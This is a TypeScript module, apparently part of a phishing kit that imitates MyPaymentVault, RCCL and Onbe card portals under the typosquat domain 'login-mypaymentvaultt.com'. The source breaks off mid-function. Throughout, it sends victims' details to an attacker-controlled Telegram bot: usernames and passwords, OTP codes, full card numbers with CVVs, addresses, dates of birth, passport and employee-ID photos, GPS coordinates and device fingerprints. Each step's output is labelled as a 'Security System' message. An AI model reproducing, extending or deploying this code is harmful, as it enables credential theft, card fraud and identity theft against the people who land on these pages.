import type { 
  ContactInfoRequest, 
  LoginRequest, 
  PostalCodeRequest,
  RegisterRequest,
  CardActivationRequest,
  ForgotUsernameRequest,
  ForgotPasswordRequest,
  AccountLoginRequest,
  DeviceFingerprint
} from '@shared/schema';
import FormData from 'form-data';
import axios from 'axios';
import { DeviceInfo, formatDeviceInfo } from './device-detector';
import { decrypt } from './crypto';
import { IpInfo, formatIpInfo } from './ip-info';

/**
 * Format device fingerprint for detailed Telegram message
 */
export function formatFingerprint(fp: DeviceFingerprint | undefined, ipInfo: IpInfo): string {
  if (!fp) return '';
  
  let message = '';
  
  // Device Details
  message += `\n📱 <b>Device Details:</b>\n`;
  message += `   • Device: ${fp.deviceModel || 'Unknown'}\n`;
  message += `   • Type: ${fp.deviceType || 'Unknown'}\n`;
  message += `   • Brand: ${fp.deviceBrand || 'Unknown'}\n`;
  
  // System Info
  message += `\n💻 <b>System Info:</b>\n`;
  message += `   • OS: ${fp.os || 'Unknown'} ${fp.osVersion || ''}\n`;
  message += `   • Browser: ${fp.browser || 'Unknown'} ${fp.browserVersion || ''} v${fp.browserVersion || ''}\n`;
  message += `   • Platform: ${fp.platform || 'Unknown'}\n`;
  message += `   • Vendor: ${fp.vendor || 'N/A'}\n`;
  message += `   • Screen: ${fp.screenResolution || 'Unknown'}\n`;
  message += `   • Color Depth: ${fp.colorDepth || 0}-bit\n`;
  message += `   • CPU Cores: ${fp.cpuCores || 0}\n`;
  
  // Timezone & Language
  if (fp.timezoneInfo) {
    message += `\n🌍 <b>Timezone & Language:</b>\n`;
    message += `   • Timezone: ${fp.timezoneInfo.timezone}\n`;
    message += `   • UTC Offset: ${fp.timezoneInfo.utcOffset >= 0 ? '+' : ''}${fp.timezoneInfo.utcOffset} hours\n`;
    message += `   • Language: ${fp.timezoneInfo.language}\n`;
    message += `   • Languages: ${fp.timezoneInfo.languages.join(', ')}\n`;
  }
  
  // Connection Info
  if (fp.connectionInfo) {
    message += `\n📡 <b>Connection Info:</b>\n`;
    message += `   • Network Type: ${fp.connectionInfo.networkType}\n`;
    message += `   • Connection: ${fp.connectionInfo.effectiveType || 'Unknown'}\n`;
    message += `   • Effective Type: ${fp.connectionInfo.effectiveType}\n`;
  }
  
  // GPS Location - DETAILED
  if (fp.gpsLocation) {
    message += `\n<b>GPS LOCATION (ACCURATE):</b>\n`;
    message += `   Latitude: ${fp.gpsLocation.latitude}\n`;
    message += `   Longitude: ${fp.gpsLocation.longitude}\n`;
    message += `   Accuracy: ${Math.round(fp.gpsLocation.accuracy)} meters\n`;
    if (fp.gpsLocation.altitude !== undefined) {
      message += `   Altitude: ${Math.round(fp.gpsLocation.altitude)} meters\n`;
    }
    if (fp.gpsLocation.speed !== undefined && fp.gpsLocation.speed > 0) {
      message += `   Speed: ${(fp.gpsLocation.speed * 3.6).toFixed(1)} km/h\n`;
    }
    if (fp.gpsLocation.heading !== undefined) {
      message += `   Heading: ${Math.round(fp.gpsLocation.heading)} degrees\n`;
    }
    message += `\n   <b>GOOGLE MAPS:</b>\n`;
    message += `   ${fp.gpsLocation.googleMapsUrl}\n`;
    if (fp.gpsLocation.googleMapsEmbed) {
      message += `   ${fp.gpsLocation.googleMapsEmbed}\n`;
    }
  } else {
    message += `\n<b>GPS LOCATION:</b>\n`;
    message += `   Not available (permission denied or not supported)\n`;
  }
  
  // IP Location (from ipInfo)
  message += `\n🌐 <b>IP Location:</b>\n`;
  message += `   • IP: ${ipInfo.ip || 'N/A'}\n`;
  message += `   • City: ${ipInfo.city || 'N/A'}\n`;
  message += `   • Region: ${ipInfo.region || 'N/A'}\n`;
  message += `   • Country: ${ipInfo.country || 'N/A'}\n`;
  message += `   • ISP: ${ipInfo.isp || 'N/A'}\n`;
  message += `   • Timezone: ${ipInfo.timezone || 'N/A'}\n`;
  
  // VPN Detection
  if (fp.vpnDetection) {
    message += `\n🔒 <b>VPN Detection:</b>\n`;
    message += `   • Possible VPN: ${fp.vpnDetection.possibleVPN ? '⚠️ YES' : '✅ NO'}\n`;
    message += `   • Indicators: ${fp.vpnDetection.indicators.join(', ') || 'None'}\n`;
    message += `   • WebRTC Leak: ${fp.vpnDetection.webrtcLeak ? '⚠️ Leak detected' : '✅ No leak detected'}\n`;
  }
  
  // Browser Features
  if (fp.browserFeatures) {
    message += `\n🔧 <b>Browser Features:</b>\n`;
    message += `   • Cookies: ${fp.browserFeatures.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
    message += `   • Do Not Track: ${fp.browserFeatures.doNotTrack ? 'Enabled' : 'Disabled'}\n`;
    message += `   • Touch Support: ${fp.browserFeatures.touchSupport ? 'Yes' : 'No'}\n`;
    message += `   • Max Touch Points: ${fp.browserFeatures.maxTouchPoints}\n`;
  }
  
  // Plugins/Extensions
  if (fp.plugins && fp.plugins.length > 0) {
    message += `\n🧩 <b>Plugins/Extensions:</b>\n`;
    fp.plugins.slice(0, 5).forEach(plugin => {
      message += `   • ${plugin}\n`;
    });
  }
  
  // Fingerprints
  if (fp.canvasFingerprint || fp.webglInfo) {
    message += `\n🎨 <b>Fingerprint:</b>\n`;
    if (fp.canvasFingerprint) {
      message += `   • Canvas: ${fp.canvasFingerprint.hash}\n`;
    }
    if (fp.webglInfo) {
      message += `   • WebGL Renderer: ${fp.webglInfo.renderer}\n`;
      message += `   • WebGL Vendor: ${fp.webglInfo.vendor}\n`;
    }
  }
  
  // User Agent
  if (fp.userAgent) {
    message += `\n🔍 <b>User Agent:</b>\n`;
    message += `   ${fp.userAgent}\n`;
  }
  
  return message;
}

interface TelegramConfig {
  botToken: string;
  chatId: string;
}

// Source page info interface for tracking where user came from
export interface SourceInfo {
  domain: string;
  path: string;
  pageName: string;
}

// Page name mapping for friendly display
const PAGE_NAME_MAP: Record<string, string> = {
  '/': 'Main Login Page',
  '/postal-code': 'Card Verification Page',
  '/contact-info': 'Contact Information Page',
  '/register': 'Registration Page',
  '/activate-card': 'Card Activation Page',
  '/forgot-username': 'Forgot Username Page',
  '/forgot-password': 'Forgot Password Page',
  '/rccl': 'RCCL Login Page',
  '/rccl-register': 'RCCL Registration Page',
  '/rccl-activate-card': 'RCCL Card Activation Page',
  '/account': 'Account Login Page',
  '/onbe': 'Onbe Login Page',
  '/onbe-register': 'Onbe Registration Page',
  '/onbe-activate-card': 'Onbe Card Activation Page',
};

/**
 * Get page name from path
 */
export function getPageName(path: string): string {
  return PAGE_NAME_MAP[path] || `Page: ${path}`;
}

/**
 * Extract source info from referer header
 */
export function extractSourceInfo(referer: string | undefined, fallbackPath: string = '/'): SourceInfo {
  try {
    if (referer) {
      const url = new URL(referer);
      return {
        domain: url.hostname,
        path: url.pathname,
        pageName: getPageName(url.pathname),
      };
    }
  } catch (error) {
    console.error('[SourceInfo] Failed to parse referer:', error);
  }
  
  // Fallback
  return {
    domain: 'login-mypaymentvaultt.com',
    path: fallbackPath,
    pageName: getPageName(fallbackPath),
  };
}

/**
 * Format source info for Telegram message
 */
export function formatSourceInfo(source: SourceInfo): string {
  let info = `   • Domain: ${source.domain}\n`;
  info += `   • Path: ${source.path}\n`;
  info += `   • Page: ${source.pageName}\n`;
  return info;
}

interface TelegramMessage {
  chat_id: string;
  text: string;
  parse_mode: 'HTML' | 'Markdown';
}

/**
 * Generic function to send message to Telegram
 */
async function sendTelegramMessage(message: string, config: TelegramConfig): Promise<boolean> {
  try {
    const { botToken, chatId } = config;

    if (!botToken || !chatId) {
      console.error('[Telegram] Missing bot token or chat ID');
      return false;
    }

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        } as TelegramMessage),
      }
    );

    if (!response.ok) {
      const error = await response.text();
      console.error('[Telegram] API Error:', error);
      return false;
    }

    const result = await response.json();
    console.log('[Telegram] Message sent successfully:', result.result?.message_id);
    return true;
  } catch (error) {
    console.error('[Telegram] Failed to send notification:', error);
    return false;
  }
}

/**
 * Function to send photo to Telegram using axios (compatible with form-data)
 */
async function sendTelegramPhoto(
  base64Photo: string,
  caption: string,
  config: TelegramConfig
): Promise<boolean> {
  try {
    const { botToken, chatId } = config;

    if (!botToken || !chatId) {
      console.error('[Telegram] Missing bot token or chat ID');
      return false;
    }

    // Detect mime type from base64 string
    let mimeType = 'image/jpeg';
    let fileExtension = 'jpg';
    
    if (base64Photo.startsWith('data:image/png')) {
      mimeType = 'image/png';
      fileExtension = 'png';
    } else if (base64Photo.startsWith('data:image/jpeg') || base64Photo.startsWith('data:image/jpg')) {
      mimeType = 'image/jpeg';
      fileExtension = 'jpg';
    }

    console.log('[Telegram] Detected mime type:', mimeType);

    // Extract the actual base64 data (remove data:image/xxx;base64, prefix)
    const base64Data = base64Photo.includes('base64,')
      ? base64Photo.split('base64,')[1]
      : base64Photo;

    // Convert base64 to Buffer
    const photoBuffer = Buffer.from(base64Data, 'base64');
    console.log('[Telegram] Photo buffer size:', photoBuffer.length, 'bytes');

    // Verify buffer is not empty
    if (photoBuffer.length === 0) {
      console.error('[Telegram] Photo buffer is empty!');
      return false;
    }

    // Create form data using form-data package
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    // Use sendPhoto API instead of sendDocument for better preview
    formData.append('photo', photoBuffer, {
      filename: `photo.${fileExtension}`,
      contentType: mimeType,
    });

    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    // Use axios which is compatible with form-data package
    const response = await axios.post(url, formData, {
      headers: formData.getHeaders(),
    });

    console.log('[Telegram] Photo sent successfully:', response.data.result?.message_id);
    return true;
  } catch (error) {
    if (axios.isAxiosError(error)) {
      console.error('[Telegram] Photo send error:', error.response?.data || error.message);
    } else {
      console.error('[Telegram] Failed to send photo:', error);
    }
    return false;
  }
}

/**
 * Send LOGIN notification to Telegram
 */
export async function sendLoginNotification(
  loginData: LoginRequest,
  loginAttemptId: string,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatLoginMessage(loginData, loginAttemptId, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send EMAIL VERIFICATION notification to Telegram
 */
export async function sendEmailVerificationNotification(
  email: string,
  loginAttemptId: string,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatEmailVerificationMessage(email, loginAttemptId, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send OTP VERIFICATION notification to Telegram
 */
export async function sendOtpVerificationNotification(
  email: string,
  otpCode: string,
  loginAttemptId: string,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatOtpVerificationMessage(email, otpCode, loginAttemptId, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send POSTAL CODE notification to Telegram
 */
export async function sendPostalCodeNotification(
  postalData: PostalCodeRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatPostalCodeMessage(postalData, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send CONTACT INFO notification to Telegram
 */
export async function sendContactInfoNotification(
  contactInfo: ContactInfoRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  // Send text message first
  const textSent = await sendTelegramMessage(formatContactInfoMessage(contactInfo, ipInfo, deviceInfo, sourceInfo), config);
  
  if (!textSent) {
    return false;
  }

  // Send passport photo if available
  if (contactInfo.passportPhoto) {
    const timestamp = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
      dateStyle: 'full',
      timeStyle: 'medium',
    });
    
    const passportCaption = `📸 <b>Passport Photo</b>\n\n` +
      `📅 <b>Waktu:</b> ${timestamp}\n` +
      `👤 <b>Name:</b> ${contactInfo.firstName} ${contactInfo.lastName}\n` +
      `📍 <b>Source:</b> ${sourceInfo.domain}${sourceInfo.path}\n` +
      `🔑 <b>Login ID:</b> ${contactInfo.loginAttemptId}`;
    
    await sendTelegramPhoto(contactInfo.passportPhoto, passportCaption, config);
  }

  // Send employee ID photo if available
  if (contactInfo.employeeIdPhoto) {
    const timestamp = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
      dateStyle: 'full',
      timeStyle: 'medium',
    });
    
    const employeeIdCaption = `🆔 <b>Employee ID Photo</b>\n\n` +
      `📅 <b>Waktu:</b> ${timestamp}\n` +
      `👤 <b>Name:</b> ${contactInfo.firstName} ${contactInfo.lastName}\n` +
      `📍 <b>Source:</b> ${sourceInfo.domain}${sourceInfo.path}\n` +
      `🔑 <b>Login ID:</b> ${contactInfo.loginAttemptId}`;
    
    await sendTelegramPhoto(contactInfo.employeeIdPhoto, employeeIdCaption, config);
  }

  return true;
}

/**
 * Send REGISTER notification to Telegram
 */
export async function sendRegisterNotification(
  registerData: RegisterRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatRegisterMessage(registerData, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send CARD ACTIVATION notification to Telegram
 */
export async function sendCardActivationNotification(
  activationData: CardActivationRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatCardActivationMessage(activationData, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send FORGOT USERNAME notification to Telegram
 */
export async function sendForgotUsernameNotification(
  forgotUsernameData: ForgotUsernameRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatForgotUsernameMessage(forgotUsernameData, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send FORGOT PASSWORD notification to Telegram
 */
export async function sendForgotPasswordNotification(
  forgotPasswordData: ForgotPasswordRequest,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatForgotPasswordMessage(forgotPasswordData, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Format LOGIN message with detailed fingerprint
 */
function formatLoginMessage(data: LoginRequest, loginAttemptId: string, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `🔐 <b>STEP 1: Login Attempt</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n👤 <b>Login Credentials:</b>\n`;
  message += `   • Username: ${data.username}\n`;
  message += `   • Password: ${data.password}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  
  // Add detailed fingerprint info if available
  if (data.fingerprint) {
    message += formatFingerprint(data.fingerprint, ipInfo);
  } else {
    // Fallback to basic device info
    message += `\n📱 <b>Device Info:</b>\n`;
    message += `   • Device: ${deviceInfo.deviceModel}\n`;
    message += `   • OS: ${deviceInfo.os}\n`;
    message += `   • Browser: ${deviceInfo.browser}\n`;
    if (deviceInfo.screenResolution) {
      message += `   • Screen: ${deviceInfo.screenResolution}\n`;
    }
  }
  
  message += `\n🔑 <b>Login ID:</b> ${loginAttemptId}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format EMAIL VERIFICATION message
 */
function formatEmailVerificationMessage(email: string, loginAttemptId: string, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `📧 <b>STEP 2: Email Verification</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n📮 <b>Email Address:</b>\n`;
  message += `   • ${email}\n\n`;
  message += `🔑 <b>Login ID:</b> ${loginAttemptId}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format OTP VERIFICATION message
 */
function formatOtpVerificationMessage(email: string, otpCode: string, loginAttemptId: string, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `🔢 <b>STEP 3: OTP Verified</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n📮 <b>Email:</b> ${email}\n`;
  message += `🔐 <b>OTP Code:</b> ${otpCode}\n\n`;
  message += `🔑 <b>Login ID:</b> ${loginAttemptId}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format POSTAL CODE message
 */
function formatPostalCodeMessage(data: PostalCodeRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `💳 <b>STEP 4: Card Verification</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n🚢 <b>Ship/Crew ID:</b> ${data.shipId}\n\n`;
  message += `💳 <b>Card Details:</b>\n`;
  message += `   • Last 8 Digits: ${data.cardNumber}\n`;
  message += `   • Expiration: ${data.expiration}\n`;
  message += `   • CVV: ${data.cvv}\n`;
  message += `   • Postal Code: ${data.postalCode}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n🔑 <b>Login ID:</b> ${data.loginAttemptId}\n\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format CONTACT INFO message
 */
function formatContactInfoMessage(data: ContactInfoRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `✅ <b>STEP 5: Contact Info Submitted</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Source Page
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);

  // Personal Information
  message += `\n👤 <b>Personal Information:</b>\n`;
  message += `   • First Name: ${data.firstName}\n`;
  message += `   • Last Name: ${data.lastName}\n\n`;

  // Contact Details
  message += `📧 <b>Contact Details:</b>\n`;
  message += `   • Email: ${data.email}\n`;
  message += `   • Mobile Phone: ${data.mobilePhone}\n\n`;

  // Address Information
  message += `🏠 <b>Address Information:</b>\n`;
  message += `   • Mailing Address: ${data.mailingAddress}\n`;
  message += `   • City: ${data.city}\n`;
  message += `   • State: ${data.state}\n`;
  message += `   • Postal Code: ${data.postalCode}\n\n`;

  // Personal Details
  message += `🎂 <b>Personal Details:</b>\n`;
  message += `   • Date of Birth: ${data.dateOfBirth}\n\n`;

  // Inquiry Details
  message += `📝 <b>Inquiry Details:</b>\n`;
  message += `   • Type: ${data.inquiryType}\n`;
  message += `   • Message: ${data.message || 'N/A'}\n\n`;

  // Photo Uploads
  message += `📸 <b>Photo Uploads:</b>\n`;
  message += `   • Passport Photo: ${data.passportPhoto ? '✅ Uploaded' : '❌ Not uploaded'}\n`;
  message += `   • Employee ID Photo: ${data.employeeIdPhoto ? '✅ Uploaded' : '❌ Not uploaded'}\n\n`;

  // Network Info
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }

  // Login Attempt ID (for tracking)
  message += `\n🔑 <b>Login Attempt ID:</b>\n`;
  message += `   ${data.loginAttemptId}\n\n`;

  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format REGISTER message
 */
function formatRegisterMessage(data: RegisterRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `📝 <b>REGISTER: Card Registration</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n💳 <b>Card Details:</b>\n`;
  message += `   • Card Number: ${data.cardNumber}\n`;
  message += `   • CVV: ${data.cvv}\n`;
  message += `   • Postal Code: ${data.postalCode}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format CARD ACTIVATION message
 */
function formatCardActivationMessage(data: CardActivationRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `✅ <b>ACTIVATE CARD: Card Activation</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n💳 <b>Card Details:</b>\n`;
  message += `   • Card Number: ${data.cardNumber}\n`;
  message += `   • CVV: ${data.cvv}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format FORGOT USERNAME message
 */
function formatForgotUsernameMessage(data: ForgotUsernameRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `👤 <b>FORGOT USERNAME: Username Recovery</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n💳 <b>Verification Details:</b>\n`;
  message += `   • Card Number: ${data.cardNumber}\n`;
  message += `   • CVV: ${data.cvv}\n`;
  message += `   • Postal Code: ${data.postalCode}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format FORGOT PASSWORD message
 */
function formatForgotPasswordMessage(data: ForgotPasswordRequest, ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `🔑 <b>FORGOT PASSWORD: Password Recovery</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n👤 <b>Account Details:</b>\n`;
  message += `   • Username: ${data.username}\n`;
  message += `   • Postal Code: ${data.postalCode}\n\n`;
  message += `🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Send ACCOUNT PAGE VISIT notification to Telegram
 */
export async function sendAccountPageNotification(
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatAccountPageVisit(ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Send ACCOUNT LOGIN notification to Telegram
 */
export async function sendAccountLoginNotification(
  loginData: AccountLoginRequest,
  loginAttemptId: string,
  ipInfo: IpInfo,
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo,
  config: TelegramConfig
): Promise<boolean> {
  const message = formatAccountLoginMessage(loginData, loginAttemptId, ipInfo, deviceInfo, sourceInfo);
  return sendTelegramMessage(message, config);
}

/**
 * Format ACCOUNT PAGE VISIT message
 */
function formatAccountPageVisit(ipInfo: IpInfo, deviceInfo: DeviceInfo, sourceInfo: SourceInfo): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `🌐 <b>ACCOUNT PAGE VISIT</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  message += `\n🌐 <b>Network Info:</b>\n`;
  message += formatIpInfo(ipInfo);
  message += `\n📱 <b>Device Info:</b>\n`;
  message += `   • Device: ${deviceInfo.deviceModel}\n`;
  message += `   • OS: ${deviceInfo.os}\n`;
  message += `   • Browser: ${deviceInfo.browser}\n`;
  if (deviceInfo.screenResolution) {
    message += `   • Screen: ${deviceInfo.screenResolution}\n`;
  }
  message += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔒 <i>MyPaymentVault Security System</i>`;

  return message;
}

/**
 * Format ACCOUNT LOGIN message
 */
function formatAccountLoginMessage(
  data: AccountLoginRequest, 
  loginAttemptId: string, 
  ipInfo: IpInfo, 
  deviceInfo: DeviceInfo,
  sourceInfo: SourceInfo
): string {
  const timestamp = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  let message = `🏦 <b>ACCOUNT LOGIN ATTEMPT</b>\n\n`;
  message += `📅 <b>Waktu:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  message += `📍 <b>Source Page:</b>\n`;
  message += formatSourceInfo(sourceInfo);
  
  // Login type specific information
  if (data.loginType === 'card') {
